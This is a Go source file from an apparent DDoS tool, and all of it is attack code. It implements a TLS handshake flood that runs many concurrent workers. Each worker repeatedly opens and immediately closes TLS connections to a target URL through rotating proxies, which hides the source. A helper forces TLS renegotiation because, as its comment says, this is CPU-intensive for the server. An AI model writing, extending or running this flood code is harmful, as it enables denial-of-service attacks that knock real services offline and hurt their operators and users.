package ddos

import (
	"crypto/tls"
	"net"
	"sync/atomic"
)

// startTLSHandshakeFlood starts TLS handshake flood attack
func (d *DDoSAttack) startTLSHandshakeFlood() {
	d.startTLSHandshakeFloodWorkers(d.config.MaxThreads)
}

// startTLSHandshakeFloodWorkers starts specified number of TLS handshake flood workers
func (d *DDoSAttack) startTLSHandshakeFloodWorkers(numWorkers int) {
	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.tlsHandshakeFloodWorker()
	}
}

// tlsHandshakeFloodWorker performs TLS handshakes without completing HTTP requests
func (d *DDoSAttack) tlsHandshakeFloodWorker() {
	defer d.wg.Done()

	for {
		select {
		case <-d.ctx.Done():
			return
		default:
			d.performTLSHandshake()
		}
	}
}

// performTLSHandshake performs a single TLS handshake and closes connection
func (d *DDoSAttack) performTLSHandshake() {
	atomic.AddInt64(&d.activeConns, 1)
	defer atomic.AddInt64(&d.activeConns, -1)

	// Determine if we should use TLS
	useTLS, _, _ := d.shouldUseTLS(d.config.TargetURL)
	if !useTLS {
		// If ForceTLS is enabled but URL parsing failed, try to force it
		if d.config.ForceTLS {
			useTLS = true
		} else {
			atomic.AddInt64(&d.requestsFailed, 1)
			return
		}
	}

	host, port, _ := d.parseTargetURL(d.config.TargetURL, useTLS)

	// Connect
	var conn net.Conn
	var err error
	var usedProxy string

	dialer := &net.Dialer{
		Timeout: d.config.Timeout,
	}

	// Proxy support for TLS handshake flood
	if d.config.UseProxy {
		// Rotate proxies if enabled
		if d.config.RotateProxy {
			if proxyURL, ok := d.getNextProxy(); ok {
				usedProxy = proxyURL
				conn, err = d.dialThroughHTTPProxy(dialer, proxyURL, host, port, useTLS)
			}
		} else if len(d.proxies) > 0 {
			// Single-proxy mode: always use the first proxy
			proxyURL := d.proxies[0]
			usedProxy = proxyURL
			conn, err = d.dialThroughHTTPProxy(dialer, proxyURL, host, port, useTLS)
		}
	}

	// Fallback to direct connection if no proxy was used
	if conn == nil && err == nil {
		tlsConfig := d.createTLSConfig()
		conn, err = tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
	}

	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		if usedProxy != "" {
			d.markProxyFailure(usedProxy)
		}
		return
	}

	// Successful connection via proxy – mark it healthy
	if usedProxy != "" {
		d.markProxySuccess(usedProxy)
	}

	// Close immediately after handshake completes
	conn.Close()

	atomic.AddInt64(&d.requestsSent, 1)
	atomic.AddInt64(&d.requestsSuccess, 1)
	// Count handshake as bytes sent (rough estimate)
	atomic.AddInt64(&d.bytesSent, 1024) // Approximate handshake size
}

// performTLSRenegotiation forces TLS renegotiation on an existing connection
func (d *DDoSAttack) performTLSRenegotiation(conn *tls.Conn) error {
	// Force renegotiation by calling Handshake again
	// This is CPU-intensive for the server
	return conn.Handshake()
}

